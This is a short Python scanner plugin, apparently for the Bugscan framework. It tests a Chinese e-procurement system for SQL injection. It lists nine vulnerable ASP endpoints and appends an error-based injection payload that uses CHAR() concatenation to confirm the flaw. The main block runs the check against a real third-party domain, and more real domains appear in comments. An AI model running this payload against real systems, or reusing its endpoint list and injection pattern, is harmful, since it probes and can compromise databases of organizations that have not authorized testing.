#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:北京网达信联通用型电子采购系统多处SQL注入打包
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0122276
#Author:xq17

def assign(service, arg):
    if service == '1caitong':
        return True, arg

def audit(arg):
    urls = [
    "Rat/ebid/viewInvite3.asp?InviteId=0000002852",
    "Rat/ebid/viewInvite4.asp?InviteId=0000002852",
    "Rat/ebid/viewInvite5.asp?InviteId=0000002852",
    "Rat/ebid/viewInvite6.asp?InviteId=0000002852",
    "Rat/ebid/viewInvite2.asp?InviteId=0000002852",
    "Rat/ebid/viewInvite1.asp?InviteId=0000002852",
    "Rat/EBid/ViewClarify1.asp?InviteId=11",
    "Rat/EBid/ViewClarify.asp?InviteId=11",
    "Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11",
    ]
    data = "%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"

    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and 'testXQ17' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('1caitong','http://tycg.jiigoo.com/')[1])
    # audit(assign('1caitong','http://zhaobiao.cdjcc.com/')[1])
    # audit(assign('1caitong','http://eps.myande.com/')[1])
    # audit(assign('1caitong','http://caigou.irico.com.cn/')[1])